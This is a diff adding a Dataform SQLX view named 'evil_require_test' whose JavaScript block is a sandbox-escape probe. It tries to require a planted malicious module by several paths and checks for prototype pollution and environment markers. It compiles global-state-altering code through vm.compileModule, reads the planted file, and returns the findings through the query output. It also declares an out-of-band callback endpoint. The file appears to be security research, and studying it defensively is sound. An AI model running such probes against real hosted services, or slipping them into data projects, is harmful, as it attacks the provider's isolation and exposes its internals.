@@ -1,0 +1,173 @@
+-- Evil Require Test
+-- Tests if require() of local module executes code
+
+config {
+  type: "view",
+  name: "evil_require_test"
+}
+
+js {
+  let results = [];
+  const oastEndpoint = "juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun";
+
+  // Test 1: Check if evil module was already loaded (auto-loaded?)
+  try {
+    const evilLoaded = Object.prototype._evilLoaded;
+    results.push("1_already_loaded: " + (evilLoaded ? "YES" : "NO"));
+  } catch(e) {
+    results.push("1_already_loaded: ERROR - " + e.message);
+  }
+
+  // Test 2: Try to require the evil module
+  try {
+    const evil = require("./includes/evil_module.js");
+    results.push("2_require_success: " + JSON.stringify(evil));
+  } catch(e) {
+    results.push("2_require: " + e.message.substring(0, 100));
+  }
+
+  // Test 3: Try alternate paths
+  try {
+    const evil2 = require("../includes/evil_module.js");
+    results.push("3_alt_path: " + JSON.stringify(evil2));
+  } catch(e) {
+    results.push("3_alt_path: " + e.message.substring(0, 80));
+  }
+
+  // Test 4: Check if pollution happened
+  try {
+    const obj = {};
+    results.push("4_pollution_check: _evilLoaded=" + obj._evilLoaded + ", _evilTimestamp=" + obj._evilTimestamp);
+  } catch(e) {
+    results.push("4_pollution: ERROR");
+  }
+
+  // Test 5: Check require log
+  try {
+    results.push("5_require_log: " + JSON.stringify(globalThis._requireLog || []));
+  } catch(e) {
+    results.push("5_require_log: ERROR");
+  }
+
+  // Test 6: Check process.env for our marker
+  try {
+    if (typeof process !== 'undefined' && process.env) {
+      results.push("6_env_marker: _EVIL_LOADED=" + process.env._EVIL_LOADED);
+    } else {
+      results.push("6_env_marker: no_process");
+    }
+  } catch(e) {
+    results.push("6_env: " + e.message);
+  }
+
+  // Test 7: Try requiring from includes directory directly
+  try {
+    const paths = [
+      "includes/evil_module",
+      "includes/evil_module.js",
+      "./includes/evil_module",
+      "/includes/evil_module.js"
+    ];
+    const pathResults = [];
+    for (const p of paths) {
+      try {
+        const m = require(p);
+        pathResults.push(p + ":OK:" + m.testValue);
+      } catch(e) {
+        pathResults.push(p + ":" + e.message.substring(0, 40));
+      }
+    }
+    results.push("7_paths: " + pathResults.join(" | "));
+  } catch(e) {
+    results.push("7_paths: ERROR");
+  }
+
+  // Test 8: Check what's in node_modules
+  try {
+    const nmExists = restricted_fs.exists("node_modules");
+    const dfExists = restricted_fs.exists("node_modules/@dataform");
+    results.push("8_node_modules: nm=" + nmExists + ", df=" + dfExists);
+  } catch(e) {
+    results.push("8_nm: ERROR");
+  }
+
+  // Test 9: Try to require from node_modules directly
+  try {
+    const df = require("@dataform/core");
+    results.push("9_df_core: " + Object.keys(df).slice(0,5).join(","));
+  } catch(e) {
+    results.push("9_df_core: " + e.message.substring(0, 80));
+  }
+
+  // Test 10: Check require.cache
+  try {
+    if (require.cache) {
+      const cacheKeys = Object.keys(require.cache);
+      results.push("10_cache: " + cacheKeys.slice(0,5).join(","));
+    } else {
+      results.push("10_cache: undefined");
+    }
+  } catch(e) {
+    results.push("10_cache: " + e.message);
+  }
+
+  // Test 11: Try vm.compileModule directly
+  try {
+    if (typeof vm !== 'undefined' && vm.compileModule) {
+      const code = "process.env.TEST = 'from_vm'; module.exports = {test: true};";
+      const compiled = vm.compileModule(code);
+      results.push("11_vm_compile: type=" + typeof compiled + ", result=" + JSON.stringify(compiled).substring(0, 50));
+    } else {
+      results.push("11_vm: not_available");
+    }
+  } catch(e) {
+    results.push("11_vm: " + e.message.substring(0, 80));
+  }
+
+  // Test 12: Check vm object methods
+  try {
+    if (typeof vm !== 'undefined') {
+      const vmKeys = Object.keys(vm);
+      const vmMethods = Object.getOwnPropertyNames(vm);
+      results.push("12_vm_methods: keys=" + vmKeys.join(",") + " | props=" + vmMethods.join(","));
+    } else {
+      results.push("12_vm: undefined");
+    }
+  } catch(e) {
+    results.push("12_vm: " + e.message);
+  }
+
+  // Test 13: Try to compile and execute with vm
+  try {
+    if (typeof vm !== 'undefined' && vm.compileModule) {
+      // Try to compile code that modifies global state
+      const testCode = `
+        globalThis.VM_EXECUTED = true;
+        module.exports = { executed: true, timestamp: Date.now() };
+      `;
+      const result = vm.compileModule(testCode);
+      results.push("13_vm_exec: " + JSON.stringify(result) + ", global_check=" + globalThis.VM_EXECUTED);
+    } else {
+      results.push("13_vm_exec: no_vm");
+    }
+  } catch(e) {
+    results.push("13_vm: " + e.message.substring(0, 80));
+  }
+
+  // Test 14: Check includes directory content
+  try {
+    const includesExists = restricted_fs.exists("includes");
+    const evilExists = restricted_fs.exists("includes/evil_module.js");
+    if (evilExists) {
+      const content = restricted_fs.readFile("includes/evil_module.js");
+      results.push("14_evil_file: len=" + content.length + ", starts=" + content.substring(0, 50));
+    } else {
+      results.push("14_evil_file: includes=" + includesExists + ", evil=" + evilExists);
+    }
+  } catch(e) {
+    results.push("14_evil: " + e.message.substring(0, 80));
+  }
+}
+
+SELECT
+  '${JSON.stringify(results)}' as evil_results
